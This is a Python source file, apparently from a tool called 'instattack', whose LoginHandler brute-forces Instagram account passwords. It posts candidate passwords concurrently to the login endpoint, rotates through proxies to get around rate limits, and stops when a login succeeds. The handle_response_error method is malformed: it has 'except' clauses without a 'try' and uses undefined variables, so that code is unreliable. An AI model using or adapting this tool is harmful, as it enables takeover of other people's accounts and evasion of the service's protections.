from __future__ import absolute_import

import asyncio
import aiohttp
import collections

from instattack import settings
from instattack.lib import starting, starting_context

from instattack.core.utils import limit_on_success, limit_as_completed

from .models import LoginAttemptContext, LoginContext
from .exceptions import ResultNotInResponse, InstagramResultError, NoPasswordsError
from .base import PostRequestHandler


class LoginHandler(PostRequestHandler):

    __name__ = 'Login Handler'

    def __init__(self, config, proxy_handler, **kwargs):
        super(LoginHandler, self).__init__(config, proxy_handler, **kwargs)

        self.limit = config['login']['pwlimit']
        self.batch_size = config['login']['batch_size']
        self.attempt_batch_size = config['login']['attempt_batch_size']

        self.results = asyncio.Queue()
        self.attempts = asyncio.Queue()
        self.passwords = asyncio.Queue()

        # Index for the current password and attempts per password.
        self.login_index = 0
        self.num_completed = 0

        self.attempts_count = collections.Counter()  # Indexed by Password
        self.proxies_count = collections.Counter()  # Indexed by Proxy Unique ID

        self.save_tasks = []

    async def run(self, loop, token):

        await self.prepopulate(loop)

        with starting_context(self):
            # Make sure we are just returning the results from the login attempts
            # method, or possibly the results consumption, depending.
            return await self.attempt_login(loop, token)

    @starting('Password Prepopulation')
    async def prepopulate(self, loop):
        futures = []
        async for password in self.user.generate_attempts(loop, limit=self.limit):
            futures.append(self.passwords.put(password))

        results = await asyncio.gather(*futures)
        for res in results:
            try:
                res.result()
            except Exception as e:
                self.log.traceback(e)
                raise e

        if len(futures) == 0:
            raise NoPasswordsError()

        self.log.complete(f"Prepopulated {len(futures)} Password Attempts")

    async def login_task_generator(self, loop, session, token):
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        while True:
            password = await self.passwords.get()
            if password:
                self.log.info('Created Task for Password %s' % password)
                yield self.login_with_password(loop, session, token, password)
                self.login_index += 1

    async def login_attempt_task_generator(self, loop, session, context):
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        while True:
            proxy = await self.proxy_handler.pool.get()
            if proxy:
                if proxy.unique_id in self.proxies_count:
                    self.log.warning(
                        f'Already Used Proxy {self.proxies_count[proxy.unique_id]} Times.',
                        extra={'proxy': proxy}
                    )

                self.proxies_count[proxy.unique_id] += 1

                yield self.login_request(
                    loop, session, context.token, context.password, proxy,
                    index=context.index)

                # Might need a lock here.
                self.attempts_count[context.password] += 1

    @starting('Login Requests')
    async def attempt_login(self, loop, token):
        """
        ClientSession
        -------------
        When ClientSession closes at the end of an async with block (or through
        a direct ClientSession.close() call), the underlying connection remains
        open due to asyncio internal details. In practice, the underlying
        connection will close after a short while. However, if the event loop is
        stopped before the underlying connection is closed, an ResourceWarning:
        unclosed transport warning is emitted (when warnings are enabled).

        To avoid this situation, a small delay must be added before closing the
        event loop to allow any open underlying connections to close.
        <https://docs.aiohttp.org/en/stable/client_advanced.html>

        TODO:
        ----
        We might want to set a max_tries parameter on the limit_as_completed call
        so we don't wind up making the same request hundreds of times if we run
        into issues.
        """
        await self.start_event.wait()

        async with aiohttp.ClientSession(
            connector=self._connector,
            timeout=self._timeout
        ) as session:
            async for result in limit_as_completed(self.login_task_generator(loop, session, token),
                    self.batch_size, stop_event=self.stop_event):

                res = await result
                if not res or not res.conclusive:
                    raise RuntimeError("Result should be valid and conclusive.")

                self.num_completed += 1
                self.log.info("{0:.2%}".format(
                    float(self.num_completed) / self.passwords.qsize()))
                await self.results.put(res)

                if res.authorized:
                    self.log.debug('Authorized Result: Setting Stop Event')
                    self.stop_event.set()
                    break

                self.log.error("Not Authenticated", extra={'password': res.context.password})
                await self.attempts.put(res.context.password)

        # await asyncio.sleep(0)

    async def attempt_single_login(self, loop, token, password):
        await self.start_event.wait()

        with starting_context(self, 'Single Login Request'):
            async with aiohttp.ClientSession(
                connector=self._connector,
                timeout=self._timeout
            ) as session:
                result = await self.login_with_password(loop, session, token, password)

        # If we return the result right away, the handler will be stopped and
        # leftover tasks will be cancelled.  We have to make sure to save the
        # proxies before doing that.
        leftover = [tsk for tsk in self.save_tasks if not tsk.done()]
        self.log.info(f'Cleaning Up {len(leftover)} Proxy Saves...')
        save_results = await asyncio.gather(*self.save_tasks, return_exceptions=True)

        leftover = [tsk for tsk in self.save_tasks if not tsk.done()]
        self.log.info(f'Done Cleaning Up {len(leftover)} Proxy Saves...')

        for i, res in enumerate(save_results):
            self.log.info('Checking Save Result %s' % i)
            if isinstance(res, Exception):
                self.log.critical('Found exception')

        leftover = [tsk for tsk in self.save_tasks if not tsk.done()]
        self.log.info(f'Now {len(leftover)} Tasks.')
        return result

    async def login_with_password(self, loop, session, token, password):
        """
        Makes concurrent fetches for a single password and limits the number of
        current fetches to the batch_size.  Will return when it finds the first
        request that returns a valid result.

        TODO:
        ----
        We might want to set a max_tries parameter on the limit_on_success call
        so we don't wind up making the same request hundreds of times if we run
        into issues.
        """

        # Wait for start event to signal that we are ready to start making
        # requests with the proxies.
        await self.start_event.wait()

        context = LoginContext(
            index=self.login_index,
            token=token,
            password=password
        )
        return await limit_on_success(
            self.login_attempt_task_generator(loop, session, context),
            self.attempt_batch_size
        )

    def handle_response_error(self, e):
        if isinstance(e, RuntimeError):
            """
            RuntimeError: File descriptor 87 is used by transport
            <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>
            """
            self.log.error(e, extra={'context': context})
            task = asyncio.create_task(self.proxy_inconclusive(proxy))
            self.save_tasks.append(task)

        elif isinstance(e, asyncio.CancelledError):
            # Don't want to mark as inconclusive because we don't want to note
            # the last time the proxy was used.
            pass

        elif isinstance(e, (
            aiohttp.ClientError,
            aiohttp.ClientProxyConnectionError,
            aiohttp.ClientConnectionError,
            aiohttp.ServerTimeoutError,
            asyncio.TimeoutError,
        )):
            if isinstance(e, aiohttp.ClientError) and e.status == 429:
                # For whatever reason these errors don't have any message...
                e.message = 'Too many requests.'

            self.log.error(e, extra={'context': context})
            task = asyncio.create_task(self.proxy_error(proxy, e))
            self.save_tasks.append(task)

        except OSError as e:
            # We have only seen this for the following:
            # >>> OSError: [Errno 24] Too many open files -> Want to sleep
            # >>> OSError: [Errno 54] Connection reset by peer
            if e.errno == 54:
                # Not sure if we want to note this at all.
                task = asyncio.create_task(self.proxy_inconclusive(proxy, e))
                self.save_tasks.append(task)

            elif e.errno == 24:
                await asyncio.sleep(3)
                self.log.error(e, extra={
                    'context': context,
                    'other': f'Sleeping for {3} seconds...'
                })
                # Not sure if we want to note this at all.
                task = asyncio.create_task(self.proxy_inconclusive(proxy, e))
                self.save_tasks.append(task)
            else:
                raise e

        except asyncio.CancelledError as e:
            # Don't want to mark as inconclusive because we don't want to note
            # the last time the proxy was used.
            pass

        except aiohttp.ClientError as e:
            # For whatever reason these errors don't have any message...
            if e.status == 429:
                e.message = 'Too many requests.'

            self.log.error(e, extra={'context': context})

            task = asyncio.create_task(self.proxy_error(proxy, e))
            self.save_tasks.append(task)

    async def login_request(self, loop, session, token, password, proxy, index=None):
        """
        TODO
        ----
        We might want to incorporate handling of a "Too Many Requests" exception
        that is smarter and will notify the handler to use a different proxy and
        note the time.
        """
        context = LoginAttemptContext(
            index=self.attempts_count[password],
            parent_index=index,
            password=password,
            token=token,
            proxy=proxy,
        )
        try:
            async with session.post(
                settings.INSTAGRAM_LOGIN_URL,
                headers=self._headers(token),
                proxy=proxy.url  # Only Http Proxies Are Supported by AioHTTP
            ) as response:
                # Only reason to log these errors here is to provide the response
                # object
                try:
                    result = await self._handle_client_response(response, context)
                except ResultNotInResponse as e:
                    self.log.error(e, extra={
                        'response': response,
                        'context': context
                    })
                    # Not sure if we want to note this as an error or not, it might
                    # be better to note as inconclusive.
                    task = asyncio.create_task(self.proxy_error(proxy, e))
                    self.save_tasks.append(task)
                else:
                    try:
                        result = await self._handle_parsed_result(result, context)
                    except InstagramResultError as e:
                        self.log.error(e, extra={'response': response, 'context': context})
                        # Not sure if we want to note this as an error or not, it might
                        # be better to note as inconclusive.
                        task = asyncio.create_task(self.proxy_error(proxy, e))
                        self.save_tasks.append(task)
                    else:
                        if not result:
                            raise RuntimeError("Result should not be None here.")

                        task = asyncio.create_task(self.proxy_success(proxy))
                        self.save_tasks.append(task)

                        return result

        except RuntimeError as e:
            """
            RuntimeError: File descriptor 87 is used by transport
            <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>
            """
            self.log.error(e, extra={'context': context})

            task = asyncio.create_task(self.proxy_inconclusive(proxy))
            self.save_tasks.append(task)

        except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
            self.log.error(e, extra={'context': context})

            task = asyncio.create_task(self.proxy_error(proxy, e))
            self.save_tasks.append(task)

        except asyncio.TimeoutError as e:
            self.log.error(e, extra={'context': context})

            task = asyncio.create_task(self.proxy_error(proxy, e))
            self.save_tasks.append(task)

        except aiohttp.ClientConnectionError as e:
            self.log.error(e, extra={'context': context})

            task = asyncio.create_task(self.proxy_error(proxy, e))
            self.save_tasks.append(task)

        except OSError as e:
            # We have only seen this for the following:
            # >>> OSError: [Errno 24] Too many open files -> Want to sleep
            # >>> OSError: [Errno 54] Connection reset by peer
            if e.errno == 54:
                # Not sure if we want to note this at all.
                task = asyncio.create_task(self.proxy_inconclusive(proxy, e))
                self.save_tasks.append(task)

            elif e.errno == 24:
                await asyncio.sleep(3)
                self.log.error(e, extra={
                    'context': context,
                    'other': f'Sleeping for {3} seconds...'
                })
                # Not sure if we want to note this at all.
                task = asyncio.create_task(self.proxy_inconclusive(proxy, e))
                self.save_tasks.append(task)
            else:
                raise e

        except asyncio.CancelledError as e:
            # Don't want to mark as inconclusive because we don't want to note
            # the last time the proxy was used.
            pass

        except aiohttp.ClientError as e:
            # For whatever reason these errors don't have any message...
            if e.status == 429:
                e.message = 'Too many requests.'

            self.log.error(e, extra={'context': context})

            task = asyncio.create_task(self.proxy_error(proxy, e))
            self.save_tasks.append(task)

    async def save(self, loop):
        self.log.info('Dumping Password Attempts')
        self.log.critical('Have to make sure were not saving a successful password.')
        return await self.user.write_attempts(self.attempts)
